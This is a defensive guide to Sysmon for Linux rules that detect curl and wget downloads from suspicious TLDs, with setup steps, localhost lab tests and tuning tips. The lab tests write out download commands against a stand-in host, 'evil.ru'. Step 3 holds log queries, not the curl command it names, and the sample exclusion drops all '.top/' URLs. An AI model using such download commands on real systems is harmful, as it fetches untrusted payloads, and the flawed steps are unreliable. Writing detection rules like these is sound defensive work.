## Sysmon for Linux rules (XML)

- Save as ```sysmon-suspicious-downloads.xml``` and merge into your existing config (details below).
- Tweak the TLD list and risky extensions for your environment.
```xml
<Sysmon schemaversion="4.50">
  <EventFiltering>

    <!-- =========================
         1) PROCESS CREATE (Event ID 1)
         Detect curl/wget invoked with suspicious TLDs, optionally with risky extensions in the URL
         ========================= -->
    <ProcessCreate onmatch="include">

      <!-- curl + suspicious TLD + risky extension (strongest signal) -->
      <RuleGroup name="Curl_SuspiciousTLD_RiskyExt" groupRelation="and">
        <Image condition="end with">/curl</Image>
        <!-- TLD tokens; keep narrow to reduce FPs -->
        <CommandLine condition="contains any">.ru/|.cn/|.su/|.tk/|.top/|.xyz/|.zip/|.click/|.pw/</CommandLine>
        <!-- Risky extensions; presence in URL path -->
        <CommandLine condition="contains any">.exe|.dll|.ps1|.bat|.js|.sh|.py|.zip|.tar.gz|.tgz|.xz|.deb|.rpm|.apk|.msi</CommandLine>
      </RuleGroup>

      <!-- wget + suspicious TLD + risky extension -->
      <RuleGroup name="Wget_SuspiciousTLD_RiskyExt" groupRelation="and">
        <Image condition="end with">/wget</Image>
        <CommandLine condition="contains any">.ru/|.cn/|.su/|.tk/|.top/|.xyz/|.zip/|.click/|.pw/</CommandLine>
        <CommandLine condition="contains any">.exe|.dll|.ps1|.bat|.js|.sh|.py|.zip|.tar.gz|.tgz|.xz|.deb|.rpm|.apk|.msi</CommandLine>
      </RuleGroup>

      <!-- curl + suspicious TLD (no extension requirement; broader) -->
      <RuleGroup name="Curl_SuspiciousTLD" groupRelation="and">
        <Image condition="end with">/curl</Image>
        <CommandLine condition="contains any">.ru/|.cn/|.su/|.tk/|.top/|.xyz/|.zip/|.click/|.pw/</CommandLine>
      </RuleGroup>

      <!-- wget + suspicious TLD (no extension requirement; broader) -->
      <RuleGroup name="Wget_SuspiciousTLD" groupRelation="and">
        <Image condition="end with">/wget</Image>
        <CommandLine condition="contains any">.ru/|.cn/|.su/|.tk/|.top/|.xyz/|.zip/|.click/|.pw/</CommandLine>
      </RuleGroup>
    </ProcessCreate>

    <!-- =========================
         2) NETWORK CONNECT (Event ID 3)
         curl/wget connecting where DestinationHostname contains suspicious TLD
         (best-effort: relies on hostname; IP-only connections won’t match)
         ========================= -->
    <NetworkConnect onmatch="include">
      <RuleGroup name="Curl_DestHost_SuspiciousTLD" groupRelation="and">
        <Image condition="end with">/curl</Image>
        <DestinationHostname condition="contains any">.ru|.cn|.su|.tk|.top|.xyz|.zip|.click|.pw</DestinationHostname>
      </RuleGroup>
      <RuleGroup name="Wget_DestHost_SuspiciousTLD" groupRelation="and">
        <Image condition="end with">/wget</Image>
        <DestinationHostname condition="contains any">.ru|.cn|.su|.tk|.top|.xyz|.zip|.click|.pw</DestinationHostname>
      </RuleGroup>
    </NetworkConnect>

    <!-- =========================
         3) FILE CREATE (Event ID 11)
         Files created by curl/wget with risky extensions (download behavior)
         ========================= -->
    <FileCreate onmatch="include">
      <RuleGroup name="Curl_File_RiskyExt" groupRelation="and">
        <Image condition="end with">/curl</Image>
        <TargetFilename condition="contains any">.exe|.dll|.ps1|.bat|.js|.sh|.py|.zip|.tar.gz|.tgz|.xz|.deb|.rpm|.apk|.msi</TargetFilename>
      </RuleGroup>
      <RuleGroup name="Wget_File_RiskyExt" groupRelation="and">
        <Image condition="end with">/wget</Image>
        <TargetFilename condition="contains any">.exe|.dll|.ps1|.bat|.js|.sh|.py|.zip|.tar.gz|.tgz|.xz|.deb|.rpm|.apk|.msi</TargetFilename>
      </RuleGroup>
    </FileCreate>

  </EventFiltering>
</Sysmon>
```
**Why these rules work**

- **ProcessCreate (EID 1)** is the most reliable for TLD logic because the CommandLine holds the full URL that curl/wget was given. Matching ```Image = /curl``` or ```/wget``` + suspicious TLD tokens narrows to the tooling and destination type you care about. Adding risky file extensions on the URL path reduces noise further.

- **NetworkConnect (EID 3)** provides DestinationHostname when available. This gives a network lens for correlation (e.g., if the URL was shortened or arguments were obfuscated). It won’t fire on IP-only connections and doesn’t see TLS SNI, so treat it as supporting context.

- **FileCreate (EID 11)** confirms write behavior from curl/wget to risky file types (e.g., ```.sh```, ```.zip```, .```deb```). It won’t always catch “extensionless” outputs (e.g., ```-O /tmp/x```), but it’s great corroboration.

Note on matching: Sysmon filters are substring-based here (```contains any```). That’s why the TLD tokens include the leading dot (e.g., ```.ru```) to avoid most accidental matches (e.g., “bruno”). Still, keep the TLD list narrow and tune for your environment.

## Implementation

**1. Back up your current config:**
```bash
sudo cp /etc/sysmon/sysmon.xml /etc/sysmon/sysmon.xml.bak 2>/dev/null || true
```

**2. Place the rules above into a file** (e.g., ```/etc/sysmon/sysmon-suspicious-downloads.xml```).
If you already have a full config, merge the ```<ProcessCreate>```, ```<NetworkConnect>```, and ```<FileCreate>``` blocks inside your ```<EventFiltering>```.

**3. Load / update the config** (typical commands):
```bash
# If Sysmon for Linux is already installed as a service
sudo sysmon -c /etc/sysmon/sysmon-suspicious-downloads.xml

# Or if installing fresh with this as the starting config
# (flags may vary by distro/build)
# sudo sysmon -i /etc/sysmon/sysmon-suspicious-downloads.xml
```
**4. Verify** Sysmon is running and emitting:
```bash
sudo systemctl status sysmon 2>/dev/null || ps aux | grep sysmon
journalctl -t sysmon -S "2 minutes ago" | tail -n +1
```
On many distros Sysmon for Linux logs to journald (tag sysmon) and/or /var/log/syslog. Adjust commands to your logging pipeline.

## Lab tests (offline-safe)
In all tests below, Sysmon should emit **EventID 1** (Process Create) and **EventID 11** (File Create) when applicable. **EventID 3** (Network Connect) may also appear if ```DestinationHostname``` is captured.

**A) HTTP test with fake suspicious TLD**

**1. Map a fake TLD to localhost:**
```bash
echo "127.0.0.1 evil.ru" | sudo tee -a /etc/hosts
```
**2. Serve a file locally:**
```bash
mkdir -p ~/webroot && cd ~/webroot
echo 'echo "malicious payload"' > payload.sh
python3 -m http.server 8000 &
```
**3. Download with curl (should fire ProcessCreate and FileCreate rules):**
```bash
# All recent Sysmon events
journalctl -t sysmon -S "5 minutes ago"

# Grep for event types (format varies by build)
journalctl -t sysmon -S "5 minutes ago" | egrep -i "EventID=1|EventID=3|EventID=11|Process Create|Network connection|File Create"
```
**4. Download with wget (same expectation):**
```bash
wget http://evil.ru:8000/payload.sh -O /tmp/payload2.sh
```
**5. Inspect Sysmon events:**
```bash
# All recent Sysmon events
journalctl -t sysmon -S "5 minutes ago"

# Grep for event types (format varies by build)
journalctl -t sysmon -S "5 minutes ago" | egrep -i "EventID=1|EventID=3|EventID=11|Process Create|Network connection|File Create"
```
**Expected clues:**

- EID 1 with Image=/.../curl or /.../wget and CommandLine containing evil.ru and /payload.sh.

- EID 3 with DestinationHostname=evil.ru (if captured).

- EID 11 with Image=/.../curl or /.../wget and TargetFilename=/tmp/payload.sh (or your chosen output).

**B) HTTPS test (best-effort)**

You can still simulate HTTPS locally; Sysmon won’t see SNI, but ProcessCreate will still show the URL:
```bash
# self-signed cert server
mkdir ~/tls-test && cd ~/tls-test
openssl genrsa -out evil.key 2048
openssl req -new -x509 -key evil.key -out evil.crt -days 365 -subj "/CN=evil.ru"
openssl s_server -key evil.key -cert evil.crt -accept 8443 -www &
# client
curl -vk https://evil.ru:8443/
journalctl -t sysmon -S "2 minutes ago" | grep -i "evil.ru" -n
```
You should see EID 1 with the full ```CommandLine``` including ```https://evil.ru:8443/```. EID 3 may show ```DestinationHostname=evil.ru``` depending on how your build populates it.

## Tuning ideas

- Reduce noise: If devs commonly use .zip from .top, split the “risky extension” rules into a separate, lower-priority bucket or exclude known-good hosts:
```xml
<!-- Example exclusion (put in a ProcessCreate onmatch="exclude" block in your main config) -->
<ProcessCreate onmatch="exclude">
  <CommandLine condition="contains any">.top/</CommandLine>
  <CommandLine condition="contains any">company-artifacts.top/</CommandLine>
</ProcessCreate>
```
- Directories: For FileCreate, add normalizers in your SIEM to only alert when ```TargetFilename``` is under ```/home```, ```/tmp```, ```/var/tmp```, ```/opt, etc```.

- Complementary controls: Pair with your Suricata HTTP rules (User-Agent + TLD + extension) and Linux auditd rules to cross-validate behavior and cut FPs.
